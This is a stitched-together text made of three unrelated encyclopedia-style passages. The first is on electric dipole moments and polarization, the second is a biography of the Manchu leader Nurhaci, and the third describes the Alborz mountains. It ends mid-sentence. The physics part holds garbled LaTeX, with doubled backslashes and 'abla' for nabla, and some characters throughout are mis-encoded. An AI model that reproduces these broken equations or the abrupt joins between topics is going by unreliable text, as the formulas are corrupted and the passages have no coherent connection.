intuitive idea of why a surface charge arises. The figure shows a uniform array of identical dipoles between two surfaces. Internally, the heads and tails of dipoles are adjacent and cancel. At the bounding surfaces, however, no cancellation occurs. Instead, on one surface the dipole heads create a positive surface charge, while at the opposite surface the dipole tails create a negative surface charge. These two opposite surface charges create a net electric field in a direction opposite to the direction of the dipoles. This idea is given mathematical form using the potential expression above. Ignoring the free charge, the potential is: : \\\\phi\\\\left(\\\\mathbf{r}\\\\right) = \\\\frac{1}{4 \\\\pi \\\\varepsilon_0} \\\\int abla_{\\\\mathbf{r}_0} \\\\cdot \\\\left(\\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right) \\\\frac{1}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right} \\\\right) d^3 \\\\mathbf{r}_0 - \\\\frac{1}{4 \\\\pi \\\\varepsilon_0} \\\\int \\\\frac{ abla_{\\\\mathbf{r}_0} \\\\cdot \\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right)}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right} d^3 \\\\mathbf{r}_0\\\\ . Using the divergence theorem, the divergence term transforms into the surface integral: :\\\\begin{align} &\\\\frac{1}{4 \\\\pi \\\\varepsilon_0} \\\\int abla_{\\\\mathbf{r}_0} \\\\cdot \\\\left(\\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right) \\\\frac{1}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right}\\\\right) d^3\\\\mathbf{r}_0 \\\\\\\\\\\\ ={} &\\\\frac{1}{4 \\\\pi \\\\varepsilon_0} \\\\int \\\\frac{\\\\mathbf{p} \\\\left(\\\\mathbf{r}_0\\\\right) \\\\cdot d \\\\mathbf{A}_0}\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right \\\\ , \\\\end{align} with dA0 an element of surface area of the volume. In the event that p(r) is a constant, only the surface term survives: :\\\\phi(\\\\mathbf{r}) = \\\\frac{1}{4 \\\\pi \\\\varepsilon_0} \\\\int \\\\frac{1}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right}\\\\ \\\\mathbf{p} \\\\cdot d\\\\mathbf{A}_0 \\\\ , with dA0 an elementary area of the surface bounding the charges. In words, the potential due to a constant p inside the surface is equivalent to that of a surface charge :\\\\sigma = \\\\mathbf{p} \\\\cdot d \\\\mathbf{A} which is positive for surface elements with a component in the direction of p and negative for surface elements pointed oppositely. (Usually the direction of a surface element is taken to be that of the outward normal to the surface at the location of the element.) If the bounding surface is a sphere, and the point of observation is at the center of this sphere, the integration over the surface of the sphere is zero: the positive and negative surface charge contributions to the potential cancel. If the point of observation is off- center, however, a net potential can result (depending upon the situation) because the positive and negative charges are at different distances from the point of observation. A brute force evaluation of the integral can be done using a multipole expansion: \\\\frac{1}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right} = \\\\sum_{\\\\ell,\\\\ m} \\\\frac{4\\\\pi}{2\\\\ell + 1} \\\\frac{1}{r} \\\\left(\\\\frac{r_0}{r}\\\\right)^\\\\ell {Y^*}_{\\\\ell}^m \\\\left(\\\\theta_0,\\\\ \\\\phi_0\\\\right) Y_{\\\\ell}^m \\\\left(\\\\theta,\\\\ \\\\phi\\\\right) . See The field due to the surface charge is: :\\\\mathbf{E}\\\\left(\\\\mathbf{r}\\\\right) = -\\\\frac{1}{4 \\\\pi \\\\varepsilon_0} abla_\\\\mathbf{r} \\\\int \\\\frac{1}{\\\\left\\\\mathbf{r} - \\\\mathbf{r}_0\\\\right}\\\\ \\\\mathbf{p} \\\\cdot d\\\\mathbf{A}_0\\\\ , which, at the center of a spherical bounding surface is not zero (the fields of negative and positive charges on opposite sides of the center add because both fields point the same way) but is instead: ::\\\\mathbf{E} = -\\\\frac{\\\\mathbf{p}}{3 \\\\varepsilon_0}\\\\ . If we suppose the polarization of the dipoles was induced by an external field, the polarization field opposes the applied field and sometimes is called a depolarization field. In the case when the polarization is outside a spherical cavity, the field in the cavity due to the surrounding dipoles is in the same direction as the polarization. For example, a droplet in a surrounding medium experiences a higher or a lower internal field depending upon whether the medium has a higher or a lower dielectric constant than that of the droplet. See In particular, if the electric susceptibility is introduced through the approximation: :\\\\mathbf{p}(\\\\mathbf{r}) = \\\\varepsilon_0 \\\\chi(\\\\mathbf{r}) \\\\mathbf{E}(\\\\mathbf{r})\\\\ , where E, in this case and in the following, represent the external field which induces the polarization. Then: : abla \\\\cdot \\\\mathbf{p}(\\\\mathbf{r}) = abla \\\\cdot \\\\left(\\\\chi(\\\\mathbf{r}) \\\\varepsilon_0 \\\\mathbf{E}(\\\\mathbf{r})\\\\right) = -\\\\rho_b\\\\ . Whenever œá(r) is used to model a step discontinuity at the boundary between two regions, the step produces a surface charge layer. For example, integrating along a normal to the bounding surface from a point just interior to one surface to another point just exterior: :\\\\varepsilon_0 \\\\hat{\\\\mathbf{n}} \\\\cdot \\\\left[\\\\chi\\\\left(\\\\mathbf{r}_+\\\\right) \\\\mathbf{E}\\\\left(\\\\mathbf{r}_+\\\\right) - \\\\chi\\\\left(\\\\mathbf{r}_-\\\\right) \\\\mathbf{E}\\\\left(\\\\mathbf{r}_-\\\\right)\\\\right] = \\\\frac{1}{A_n} \\\\int d \\\\Omega_n\\\\ \\\\rho_b = 0\\\\ , where An, Œ©n indicate the area and volume of an elementary region straddling the boundary between the regions, and \\\\hat{\\\\mathbf{n}} a unit normal to the surface. The right side vanishes as the volume shrinks, inasmuch as œÅb is finite, indicating a discontinuity in E, and therefore a surface charge. That is, where the modeled medium includes a step in permittivity, the polarization density corresponding to the dipole moment density :\\\\mathbf{p}(\\\\mathbf{r}) = \\\\chi(\\\\mathbf{r}) \\\\mathbf{E}(\\\\mathbf{r}) necessarily includes the contribution of a surface charge. A physically more realistic modeling of p(r) would have the dipole moment density drop off rapidly, but smoothly to zero at the boundary of the confining region, rather than making a sudden step to zero density. Then the surface charge will not concentrate in an infinitely thin surface, but instead, being the divergence of a smoothly varying dipole moment density, will distribute itself throughout a thin, but finite transition layer. Dielectric sphere in uniform external electric field Field lines of the D-field in a dielectric sphere with greater susceptibility than its surroundings, placed in a previously-uniform field.Based upon equations from , which refers to papers by Sir W. Thomson. The field lines of the E-field (not shown) coincide everywhere with those of the D-field, but inside the sphere, their density is lower, corresponding to the fact that the E-field is weaker inside the sphere than outside. Many of the external E-field lines terminate on the surface of the sphere, where there is a bound charge. The above general remarks about surface charge are made more concrete by considering the example of a dielectric sphere in a uniform electric field. The sphere is found to adopt a surface charge related to the dipole moment of its interior. A uniform external electric field is supposed to point in the z-direction, and spherical-polar coordinates are introduced so the potential created by this field is: :\\\\phi_\\\\infty = -E_\\\\infty z = -E_\\\\infty r \\\\cos\\\\theta\\\\ . The sphere is assumed to be described by a dielectric constant Œ∫, that is, :\\\\mathbf{D} = \\\\kappa \\\\epsilon_0 \\\\mathbf{E}\\\\ , and inside the sphere the potential satisfies Laplace's equation. Skipping a few details, the solution inside the sphere is: :\\\\phi_< = A r \\\\cos\\\\theta\\\\ , while outside the sphere: :\\\\phi_> = \\\\left(Br + \\\\frac{C}{r^2} \\\\right) \\\\cos\\\\theta\\\\ . At large distances, œÜ> ‚Üí œÜ‚àû so B = ‚àíE‚àû . Continuity of potential and of the radial component of displacement D = Œ∫Œµ0E determine the other two constants. Supposing the radius of the sphere is R, :A = -\\\\frac{3}{\\\\kappa + 2} E_\\\\infty\\\\ ;\\\\ C = \\\\frac{\\\\kappa - 1}{\\\\kappa + 2} E_\\\\infty R^3\\\\ , As a consequence, the potential is: :\\\\phi_> = \\\\left(-r + \\\\frac{\\\\kappa - 1}{\\\\kappa + 2} \\\\frac{R^3}{r^2}\\\\right) E_\\\\infty \\\\cos\\\\theta\\\\ , which is the potential due to applied field and, in addition, a dipole in the direction of the applied field (the z-direction) of dipole moment: :\\\\mathbf{p} = 4 \\\\pi \\\\varepsilon_0 \\\\left(\\\\frac{\\\\kappa - 1}{\\\\kappa + 2} R^3\\\\right) \\\\mathbf{E}_\\\\infty\\\\ , or, per unit volume: :\\\\frac{\\\\mathbf{p}}{V} = 3 \\\\varepsilon_0 \\\\left(\\\\frac{\\\\kappa - 1}{\\\\kappa + 2}\\\\right) \\\\mathbf{E}_\\\\infty\\\\ . The factor (Œ∫ ‚àí 1)/(Œ∫ + 2) is called the Clausius‚ÄìMossotti factor and shows that the induced polarization flips sign if Œ∫ < 1\\\\. Of course, this cannot happen in this example, but in an example with two different dielectrics Œ∫ is replaced by the ratio of the inner to outer region dielectric constants, which can be greater or smaller than one. The potential inside the sphere is: :\\\\phi_< = -\\\\frac{3}{\\\\kappa + 2} E_\\\\infty r \\\\cos\\\\theta\\\\ , leading to the field inside the sphere: :- abla \\\\phi_< = \\\\frac{3}{\\\\kappa + 2} \\\\mathbf{E}_\\\\infty = \\\\left(1 - \\\\frac{\\\\kappa - 1}{\\\\kappa + 2}\\\\right)\\\\mathbf{ E}_\\\\infty\\\\ , showing the depolarizing effect of the dipole. Notice that the field inside the sphere is uniform and parallel to the applied field. The dipole moment is uniform throughout the interior of the sphere. The surface charge density on the sphere is the difference between the radial field components: :\\\\sigma = 3 \\\\varepsilon_0 \\\\frac{\\\\kappa - 1}{\\\\kappa + 2} E_\\\\infty \\\\cos\\\\theta = \\\\frac{1}{V} \\\\mathbf{p} \\\\cdot \\\\hat{\\\\mathbf{R}}\\\\ . This linear dielectric example shows that the dielectric constant treatment is equivalent to the uniform dipole moment model and leads to zero charge everywhere except for the surface charge at the boundary of the sphere. =General media= If observation is confined to regions sufficiently remote from a system of charges, a multipole expansion of the exact polarization density can be made. By truncating this expansion (for example, retaining only the dipole terms, or only the dipole and quadrupole terms, or etc.), the results of the previous section are regained. In particular, truncating the expansion at the dipole term, the result is indistinguishable from the polarization density generated by a uniform dipole moment confined to the charge region. To the accuracy of this dipole approximation, as shown in the previous section, the dipole moment density p(r) (which includes not only p but the location of p) serves as P(r). At locations inside the charge array, to connect an array of paired charges to an approximation involving only a dipole moment density p(r) requires additional considerations. The simplest approximation is to replace the charge array with a model of ideal (infinitesimally spaced) dipoles. In particular, as in the example above that uses a constant dipole moment density confined to a finite region, a surface charge and depolarization field results. A more general version of this model (which allows the polarization to vary with position) is the customary approach using electric susceptibility or electrical permittivity. A more complex model of the point charge array introduces an effective medium by averaging the microscopic charges; for example, the averaging can arrange that only dipole fields play a role. A related approach is to divide the charges into those nearby the point of observation, and those far enough away to allow a multipole expansion. The nearby charges then give rise to local field effects. In a common model of this type, the distant charges are treated as a homogeneous medium using a dielectric constant, and the nearby charges are treated only in a dipole approximation. The approximation of a medium or an array of charges by only dipoles and their associated dipole moment density is sometimes called the point dipole approximation, the discrete dipole approximation, or simply the dipole approximation. Electric dipole moments of fundamental particles Not to be confused with spin which refers to the magnetic dipole moments of particles, much experimental work is continuing on measuring the electric dipole moments (EDM) of fundamental and composite particles, namely those of the electron and neutron, respectively. As EDMs violate both the parity (P) and time-reversal (T) symmetries, their values yield a mostly model-independent measure of CP- violation in nature (assuming CPT symmetry is valid). Therefore, values for these EDMs place strong constraints upon the scale of CP-violation that extensions to the standard model of particle physics may allow. Current generations of experiments are designed to be sensitive to the supersymmetry range of EDMs, providing complementary experiments to those done at the LHC. Indeed, many theories are inconsistent with the current limits and have effectively been ruled out, and established theory permits a much larger value than these limits, leading to the strong CP problem and prompting searches for new particles such as the axion. Dipole moments of molecules Dipole moments in molecules are responsible for the behavior of a substance in the presence of external electric fields. The dipoles tend to be aligned to the external field which can be constant or time-dependent. This effect forms the basis of a modern experimental technique called dielectric spectroscopy. Dipole moments can be found in common molecules such as water and also in biomolecules such as proteins. By means of the total dipole moment of some material one can compute the dielectric constant which is related to the more intuitive concept of conductivity. If \\\\mathcal{M}_{\\\\rm Tot} \\\\, is the total dipole moment of the sample, then the dielectric constant is given by, :\\\\epsilon = 1 + k \\\\left\\\\langle \\\\mathcal{M}_\\\\text{Tot}^2 \\\\right\\\\rangle where k is a constant and \\\\left\\\\langle \\\\mathcal{M}_\\\\text{Tot}^2 \\\\right\\\\rangle = \\\\left\\\\langle \\\\mathcal{M}_\\\\text{Tot} (t = 0) \\\\mathcal{M}_\\\\text{Tot}(t = 0) \\\\right\\\\rangle is the time correlation function of the total dipole moment. In general the total dipole moment have contributions coming from translations and rotations of the molecules in the sample, : \\\\mathcal{M}_\\\\text{Tot} = \\\\mathcal{M}_\\\\text{Trans} + \\\\mathcal{M}_\\\\text{Rot}. Therefore, the dielectric constant (and the conductivity) has contributions from both terms. This approach can be generalized to compute the frequency dependent dielectric function. It is possible to calculate dipole moments from electronic structure theory, either as a response to constant electric fields or from the density matrix. Such values however are not directly comparable to experiment due to the potential presence of nuclear quantum effects, which can be substantial for even simple systems like the ammonia molecule. Coupled cluster theory (especially CCSD(T)) can give very accurate dipole moments, although it is possible to get reasonable estimates (within about 5%) from density functional theory, especially if hybrid or double hybrid functionals are employed. The dipole moment of a molecule can also be calculated based on the molecular structure using the concept of group contribution methods.

Nurhaci was part of the Aisin Gioro clan, and reigned as the founding Khan of Later Jin from 1616 to 1626. Nurhaci reorganised and united various Jurchen tribes (the later \\"Manchu\\"), consolidated the Eight Banners military system, and eventually launched attacks on Ming dynasty of China and Joseon dynasty of Korea. His conquest of Ming dynasty's northeastern Liaodong province laid the groundwork for the conquest of the rest of China by his descendants, who founded the Qing dynasty in 1636. He is also generally credited with ordering the creation of a new written script for the Manchu language based on the Mongolian vertical script. Name and titles Nurhaci is written as in Manchu language. Some suggests that the meaning of the name in the Manchu language is \\"the skin of a wild boar\\". Regarded as the founding father of the Qing dynasty, he is given the customary temple name of Taizu, which is traditionally assigned to founders of dynasties. His name is also alternatively spelled Nurgaci, Nurhachi, or Nu-er-ha-chi (the last of these simply the transcription of the Chinese characters used to write his name). Nurhaci was the last chieftain of the Jianzhou Jurchens and First Khan of the Later Jin dynasty. His title in Manchu as Khan was Geren Gurun-be Ujire Genggiyen Han (\\"Brilliant Khan Who Benefits All Nations\\"). His era name was Tianming (; Manchu:Abkai Fulingga), in Mongolian –¢—ç–Ω–≥—ç—Ä–∏–π–Ω —Å“Ø–ª–¥—ç—Ç Tengri-yin S√ºldet√º. It means \\"Heaven's Mandate.\\" He was given a posthumous name in 1736 (see infobox), the shortened form of which was \\"Emperor Gao\\" (Wade‚ÄìGiles: Emperor Kao; , Manchu:Dergi H≈´wangdi) Early life Nurhaci was born on 8 April 1559. Being a member of the Gioro clan of the Suksuhu River tribe, Nurhaci also claimed descent from Mentemu, a Jurchen headman who lived some two centuries earlier. The young man grew up as a soldier in the household of the Ming dynasty general Li Chengliang in Fushun, where he learned Quonha, the official language of the courts. Nurhaci read the Chinese novels Romance of the Three Kingdoms and Water Margin learning all he knew about Chinese military and political strategies from them. He named his clan Aisin Gioro around 1612, when he formally ascended the throne as the Khan of the Later Jin dynasty. In 1582, Nurhaci's father Taksi and grandfather Giocangga were killed in an attack on Gure (now a village in Xinbin Manchu Autonomous County) by a rival Jurchen chieftain, Nikan Wailan (\\"Nikan Wailan\\" means \\"secretary of Han Chinese\\" in the Jurchen language, thus his existence is suspected by some historians.) while being led by Li Chengliang. The following year, Nurhaci began to unify the Jurchen bands around his area. In 1584, when Nurhaci was 25, he attacked Nikan Wailan at Turun (today a village in Xinbin too) to avenge the deaths of his father and grandfather, who are said to have left him nothing but thirteen suits of armor. Nikan Wailan fled away to Erhun, which Nurhaci attacked again in 1587. Nikan Wailan this time fled to Li Chengliang's territory. Later, as a way to build relationship, Li gave Nikan Wailan to Nurhaci, who beheaded Nikan Wailan immediately. With Li's support, Nurhaci gradually grew his strength in the following years. Unifying the Jurchen tribes In 1593, the Yehe called upon a coalition of nine tribes: the Hada, Ula, Hoifa, Khorchin Mongols, Sibe, Guwalca, Ju≈°eri, Neyen, and the Yehe themselves to attack the Jianzhou Jurchens. The coalition was defeated at the Battle of Gure and Nurhaci emerged victorious. From 1599 to 1618, Nurhaci set out on a campaign against the four Hulun tribes. He began by attacking the Hada in 1599 and conquering them in 1603. Then in 1607, Hoifa was also conquered with the death of its beile Baindari, followed by an expedition against Ula and its beile Bujantai in 1613, and finally the Yehe and its beile Gintaisi at the Battle of Sarhu in 1619. In 1599, Nurhaci gave two of his translators, Erdeni Baksi ('Jewel Teacher' in Mongolian) and Dahai Jarg≈´ci,Matsumura Jun, p.131 A Re- examinations of the Story of the Founding of the Ch'ing Dynasty „ÄéÊ∏ÖÊúùÈñãÂõΩË™¨Ë©±ÂÜçËÄÉ„Äè(in Japanese) the task of creating a Manchu alphabet by adapting the Mongolian script. In 1606, he was granted the title of Kundulun Khan by the Mongols. At the Battle of Sarhu Nurhaci defeated a four-pronged Chinese offensive intended to capture his capital of Hetu Ala by concentrating his forces in one column at a time. In 1616, Nurhaci declared himself Khan and founded the Jin dynasty (aisin gurun), often called the Later Jin in reference to the legacy of the earlier Jurchen Jin dynasty of the 12th century. He constructed a palace at Mukden (present-day Shenyang, Liaoning). The \\"Later Jin\\" was renamed to \\"Qing\\" by his son Hong Taiji after his death in 1626, however Nurhaci is usually referred to as the founder of the Qing dynasty. In order to help with the newly organized administration, five of his trusted companions were appointed as his chief councilors, Anfiyangg≈´, Eidu, H≈´rhan, Fiongdon, and Hohori. Nurhaci captured Liaoyang in 1621 and made it the capital of his empire until 1625. Only after he became Khan did he finally unify the Ula (clan of his consort Lady Abahai, mentioned below) and the Yehe, the clan of his consort Monggo Jerjer. Nurhaci chose to variously emphasize either differences or similarities in lifestyles with other peoples like the Mongols for political reasons. Nurhaci said to the Mongols that \\"The languages of the Chinese and Koreans are different, but their clothing and way of life is the same. It is the same with us Manchus (Jurchen) and Mongols. Our languages are different, but our clothing and way of life is the same.\\" Later Nurhaci indicated that the bond with the Mongols was not based in any real shared culture, rather it was for pragmatic reasons of \\"mutual opportunism\\", when he said to the Mongols: \\"You Mongols raise livestock, eat meat and wear pelts. My people till the fields and live on grain. We two are not one country and we have different languages.\\" When the Jurchens were reorganized by Nurhaci into the Eight Banners, many Manchu clans were artificially created as a group of unrelated people founded a new Manchu clan (mukun) using a geographic origin name such as a toponym for their hala (clan name). The irregularities over Jurchen and Manchu clan origin led to the Qing trying to document and systematize the creation of histories for Manchu clans, including manufacturing an entire legend around the origin of the Aisin Gioro clan by taking mythology from the northeast. Invasion of Ming China In 1618, Nurhaci commissioned a document entitled the Seven Grievances in which he enumerated seven problems with Ming rule and began to rebel against the domination of the Ming dynasty. A majority of the grievances dealt with conflicts against Yehe, and Ming favouritism of Yehe. Nurhaci led many successful engagements against the Ming Chinese, the Koreans, the Mongols, and other Jurchen clans, greatly enlarging the territory under his control. The first capitals of the state established by Nurhaci were Fe Ala and Hetu Ala.http://www.dartmouth.edu/~qing/WEB/NURHACI.html Han Chinese participated in the construction of Hetu Ala, the capital of Nurhaci's state. Defectors from the Ming side played a massive role in the Qing conquest of the Ming. Ming generals who defected to the Manchus were often married to women from the Aisin Gioro clan while lower-ranked defectors were given non- imperial Manchu women as wives. Nurhaci arranged for a marriage between one of his granddaughters and the Ming general Li Yongfang (ÊùéÊ∞∏Ëä≥) after Li surrendered Fushun in Liaoning to the Manchus in 1618 as the result of the Battle of Fushun. His son Abatai's daughter was married to Li Yongfang.https://read01.com/aP055D.html The offspring of Li received the \\"Third Class Viscount\\" () title. Li Yongfang was the great great great grandfather of Li Shiyao Êùé‰æçÂ†Ø.http://www.dartmouth.edu/~qing/WEB/LI_SHIH- YAO.htmlhttp://12103081.wenhua.danyy.com/library1210shtml30810106630060.html The Han prisoner of war Gong Zhenglu (Onoi) was appointed to instruct Nurhaci's sons and received gifts of slaves, wives, and a domicile from Nurhaci after Nurhaci rejected offers of payment to release him back to his relatives. Nurhaci had treated Han in Liaodong differently according to how much grain they had, those with less than 5 to 7 sin were treated like chattel while those with more than that amount were rewarded with property. Due to a revolt by Han in Liaodong in 1623, Nurhachi, who previously gave concessions to conquered Han subjects in Liaodong, turned against them and ordered that they no longer be trusted and enacted discriminatory policies and killings against them, while ordering that Han who assimilated to the Jurchen (in Jilin) before 1619 be treated equally as Jurchens were and not like the conquered Han in Liaodong. By May 1621, Nurhaci had conquered the cities of Liaoyang and Shenyang. In April 1625, he designated Shenyang the new capital city, which would hold that status until the Qing conquest of the Ming in 1644.Arthur W. Hummel, Eminent Chinese of the Ch‚Äôing Period, (Washington, DC: Government Printing Office, 1943), p. 597 Ningyuan, 1626. Finally in 1626, Nurhaci suffered the first serious military defeat of his life at the hands of the Ming general Yuan Chonghuan. Nurhaci was wounded by the Portuguese-made cannons in Yuan's army at the Battle of Ningyuan. Unable to recover either physically or mentally, he died two days later in Aiji Fort (ÈùâÈõûÂ†°; in present- day Da'aijinbao Village, Dijia Township, Yuhong District, Shenyang) on 30 September at the age of 67. His tomb, Fu Mausoleum (), is located east of Shenyang. The first Manchu translations of Chinese works were the Six Secret Teachings (), Sushu Á¥†Êõ∏, and Three Strategies of Huang Shigong (), all Chinese military texts dedicated to the arts of war due to the Manchu interests in the topic, like Sun-Tzu's work The Art of War. The military related texts which were translated into Manchu from Chinese were translated by Dahai. Manchu translations of Chinese texts included the Ming penal code and military texts were performed by Dahai. These translations were requested of Dahai by Nurhaci. The military text Wuzi was translated into Manchu along with The Art of War. Chinese history, Chinese law, and Chinese military theory classical texts were translated into Manchu during the rule of Hong Taiji in Mukden (now Shenyang), with the Manchus placing significance upon military and governance related Chinese texts. A Manchu translation was made of the military-themed novel Romance of the Three Kingdoms. Chinese literature, military theory and legal texts were translated into Manchu by Dahai and Erdeni. The translations were ordered in 1629. The translation of the military texts Sushu and Three Strategies of Huang Shigong, and the Da Ming Huidian () done by Dahai was ordered by Nurhaci.http://www.dartmouth.edu/~qing/WEB/DAHAI.html While it was mainly administrative and ethical guidance which made up most of the Three Strategies of Huang Shigong and the Sushu, military science was indeed found in the Six Secret Teachings and Chinese military manuals were eagerly translated by the Manchus. They were also attracted to the military content in Romance of the Three Kingdoms, which is why it was translated. The Art of War was translated into Manchu as Abkai: qoohai baita be gisurengge,http://library.umac.mo/ebooks/b31043252.pdf M√∂llendorff: coohai baita be gisurengge, Discourse on the art of War. Another later Manchu translation was made by Aisin Gioro Qiying.http://sino- platonic.org/complete/spp178_art_of_war.pdf p. 82 Legacy In 1621, Nurhaci started the construction of a new palace, the Mukden Palace, for his Later Jin dynasty's capital of Mukden (now Shenyang). Among the most lasting contributions Nurhaci left his descendants was the establishment of the Eight Banners, which would eventually form the backbone of the military that dominated the Qing Empire. The status of Banners did not change much over the course of Nurhaci's lifetime, nor in subsequent reigns, remaining mostly under the control of the royal family. The two elite Yellow Banners were consistently under Nurhaci's control. The two Blue Banners were controlled by Nurhaci's brother ≈†urhaci until he died, at which point the Blue Banners were given to ≈†urhaci's two sons, Chiurhala and Amin. Nurhaci's eldest son, Cuyen, controlled the White Banner for most of his father's reign until he rebelled. Then the Bordered White Banner was given to Nurhaci's grandson and the Plain White was given to his eighth son and heir, Hong Taiji. However, by the end of Nurhaci's reign, Hong Taiji controlled both White Banners. Finally, the Red Banner was run by Nurhaci's second son Dai≈°an. Later in Nurhaci's reign, the Bordered Red Banner was handed down to his son. Dai≈°an and his son would continue holding the two Red Banners well into the end of Hong Taiji's reign. Battle of Ningyuan in which Nurhaci was wounded and died The details of Hong Taiji's succession as the Khan of the Later Jin dynasty are unclear.. When he died in late 1626, Nurhaci did not designate an heir; instead he encouraged his sons to rule collegially.. Three of his sons and a nephew were the \\"four senior beiles\\": Dai≈°an (43 years old), Amin (son of Nurhaci's brother ≈†urhaci; 40 or 41), Mangg≈´ltai (38 or 39), and Hong Taiji himself (33).. On the day after Nurhaci's death, they coerced his primary consort Lady Abahai (1590-1626) - who had borne him three sons: Ajige, Dorgon, and Dodo - to commit suicide to accompany him in death.. This gesture has made some historians suspect that Nurhaci had in fact named the fifteen-year-old Dorgon as a successor, with Dai≈°an as regent., note 127, citing . By forcing Dorgon's mother to kill herself, the princes removed a strong base of support for Dorgon. The reason such intrigue was necessary is that Nurhaci had left the two elite Yellow Banners to Dorgon and Dodo, who were the sons of Lady Abahai. Hong Taiji exchanged control of his two White Banners for that of the two Yellow Banners, shifting their influence and power from his young brothers onto himself. According to Hong Taiji's later recollections, Amin and the other beile were willing to accept Hong Taiji as Khan, but Amin then would have wanted to leave with his Bordered Blue Banner, threatening to dissolve Nurhaci's unification of the Jurchens.. Eventually the older Dai≈°an worked out a compromise that allowed Hong Taiji as the Khan, but almost equal to the other three senior beiles.. Hong Taiji would eventually find ways to become the undisputed leader. The change of the name from Jurchen to Manchu by Hong Taiji was made to hide the fact that the ancestors of the Manchus, the Jianzhou Jurchens, were ruled by the Chinese. Via Dartmouth.edu The Qing dynasty carefully hid the two original editions of the books of \\"Qing Taizu Wu Huangdi Shilu\\" and the \\"Manzhou Shilu Tu\\" (Taizu Shihlu Tu) in the Qing palace, forbidden from public view because they showed that the Manchu Aisin Gioro family had been ruled by the Ming dynasty. Via Dartmouth.edu In the Ming period, the Koreans of Joseon referred to the Jurchen-inhabited lands north of the Korean peninsula, above the rivers Yalu and Tumen, as part of Ming China, which they called the \\"superior country\\" (sangguk). Primary sources Information concerning Nurhaci can be found in later, propagandistic works such as the Manchu Veritable Records (; Manchu:, M√∂lendroff: manju-i yargiyan kooli). Good contemporary sources are also available. For instance, much material concerning Nurhaci's rise is preserved within Korean sources such as the Veritable Records of the Joseon Dynasty (), especially the Seonjo Sillok and the Gwanghaegun Ilgi. Indeed, the record of Sin Chung-il's trip to Jianzhou is preserved in the Seonjo Sillok. The Jiu Manzhou Dang from Nurhaci's reign also survives. A revised transcription of these records (with the dots and circles added to the script) was commissioned by the Qianlong Emperor. This has been translated into Japanese under the title Manbun roto, and Chinese, under the title Manwen Laodang (). A project is currently under way at Harvard University to translate them into English, as The Old Manchu Chronicles. Physical appearance According to the account of Korean ambassadors, Nurhaci was a physically strong man with a long and stern-looking face and that his nose was straight and big, and just like most of the other Manchu men, he shaved most of his facial hair and kept only his moustache.

This mountain range is divided into the Western, Central, and Eastern Alborz Mountains. The Western Alborz Range (usually called the Talysh) runs south-southeastward almost along the western coast of the Caspian Sea. The Central Alborz (the Alborz Mountains in the strictest sense) runs from west to east along the entire southern coast of the Caspian Sea, while the Eastern Alborz Range runs in a northeasterly direction, toward the northern parts of the Khorasan region, southeast of the Caspian Sea. Mount Damavand, the highest mountain in Iran measuring 5,610.0 m (18,405.5 ft), is located in the Central Alborz Mountains. Etymology The name Alborz is derived from HarƒÅ Barazaitƒ´, a legendary mountain in the Avesta, the main text of Zoroastrianism. HarƒÅ Barazaitƒ´ is from a Proto-Iranian name, *HarƒÅ B·πõzatƒ´, meaning \\"Mountain Rampart.\\" *B·πõzatƒ´ is the feminine form of the adjective *b·πõzant- \\"high\\", the ancestor of modern Persian bouland (ÿ®ŸÑŸÜÿØ) and Barz/Berazandeh, cognate with Sanskrit Brihat (‡§¨‡•É‡§π‡§§‡•ç). HarƒÅ may be interpreted as \\"watch\\" or \\"guard\\", from an Indo-European root *ser- \\"protect\\". In Middle Persian, HarƒÅ Barazaitƒ´ became Harborz, Modern Persian Alborz, which is a cognate with Elbrus, the highest peak of the Caucasus. Alborz Mountain range seen from Tehran Milad Tower's view to the city and mountains. Mythology Zoroastrians seems to identify the range with the dwelling place of the Peshyotan, and the Zoroastrian Ilm-e-Kshnoom sect identifies Mount Davamand as the home of the Saheb-e-Dilan ('Masters of the Heart'). In his epic Shahnameh, the poet Ferdowsi speaks of the mountains \\"as though they lay in India.\\" This could reflect older usage, for numerous high peaks were given the name, and some even reflect it to this day, including Mount Elbrus in the Caucasus Mountains and Mount Elbariz (Albariz, Jebal Barez) in the Kerman area above the Strait of Hormuz. All these names reflect the same Iranian language compound, and have been speculatively identified, at one time or another, as the legendary mountain HarƒÅ B…ôr…ôzaitƒ´ of the Avesta. Geology The Alborz mountain range forms a barrier between the south Caspian and the Iranian plateau. It is only 60‚Äì130 km wide and consists of sedimentary series dating from Upper Devonian to Oligocene, prevalently Jurassic limestone over a granite core. Continental conditions regarding sedimentation are reflected by thick Devonian sandstones and by Jurassic shales containing coal seams. Marine conditions are reflected by Carboniferous and Permian strata that are composed mainly of limestones. In the Eastern Alborz Range, the far eastern section is formed by Mesozoic (chiefly Triassic and Jurassic) rocks, while the western part of the Eastern Alborz Range is made primarily of Paleozoic rocks. Precambrian rocks can be found chiefly south of the city of Gorgan situated in the southeast of the Caspian Sea and, in much smaller amounts, in the central and western parts of the Central Alborz Range. The central part of the Central Alborz Range is formed mainly of Triassic and Jurassic rocks, while the northwestern section of the range is mainly composed of Jurassic rocks. Very thick beds of Tertiary (mostly Eocene) green volcanic tuffs and lavas are found mainly in the southwestern and south-central parts of the range. The far northwestern part of the Alborz, that constitutes the Western Alborz Range or the Talish Mountains, is mainly made up of Upper Cretaceous volcano- sedimentary deposits, with a strip of Paleozoic rocks and a band of Triassic and Jurassic rocks in the southern parts, both in a northwest-southeast direction. As the Tethys Sea was closed and the Arabian Plate collided with the Iranian Plate, and was pushed against it, and with the clockwise movement of the Eurasian Plate towards the Iranian Plate and their final collision, the Iranian Plate was pressed from both sides. The collisions finally caused the folding of the Upper Paleozoic, Mesozoic, and Paleogene rocks and the Cenozoic (chiefly the Eocene) volcanism, to form the Alborz Mountains, primarily during the Miocene. The Alpine orogeny began, therefore, with Eocene volcanism in southwestern and south-central parts of the Alborz, and continued with the uplift and folding of the older sedimentary rocks in the northwestern, central and eastern parts of the range, during the most important orogenic phases, which date from the Miocene and Pliocene epochs. Ecoregions, flora and fauna While the southern slopes of the Alborz Mountains are usually semiarid or arid, with irregular and low precipitation, the northern slopes of the range are usually humid, especially in the western parts of the Central Alborz. In the southern slopes or the Elburz Range forest steppe ecoregion, the higher 